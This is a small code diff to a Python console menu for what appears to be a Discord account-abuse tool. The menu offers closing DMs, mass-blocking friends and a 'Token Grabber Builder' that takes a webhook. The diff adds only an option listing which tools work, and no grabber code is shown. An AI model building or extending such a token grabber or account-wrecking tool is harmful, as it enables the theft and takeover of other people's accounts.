@@ -30,7 +30,7 @@ ___________              .__                ________
                      ║ [6] Close DMs                 ║   ║ [15] Information              ║
                      ║ [7] Create Servers            ║   ║ [16] CREDITS                  ║
                      ║ [8] Block All Friends         ║   ║ [17] EXIT                     ║
-                     ║ [9] Token Grabber Builder     ║   ║                               ║
+                     ║ [9] Token Grabber Builder     ║   ║ [18] Available tools          ║
                      ╚═══════════════════════════════╝   ╚═══════════════════════════════╝
                      we recommend Option 13 and 11
                      educational purposes only
@@ -82,6 +82,20 @@ def owner():
     elif lmao == "9":
         webhook = input(Fore.RED + "Webhook[>] ")
         downloadgrabber(webhook=webhook)
+    elif lmao == "18":
+        print("                     available tools:")
+        print("""                   2 done
+                                    3 done
+                                    5 done
+                                    6 done
+                                    9 done
+                                    11 done
+                                    13 done
+                                    14 done
+                                    15 done
+                                    16 done
+                                    17 done 
+                                    """)
     else:
         input("Invalid Input! Please take a look at wich tools are currently working(option 18)")
         owner()
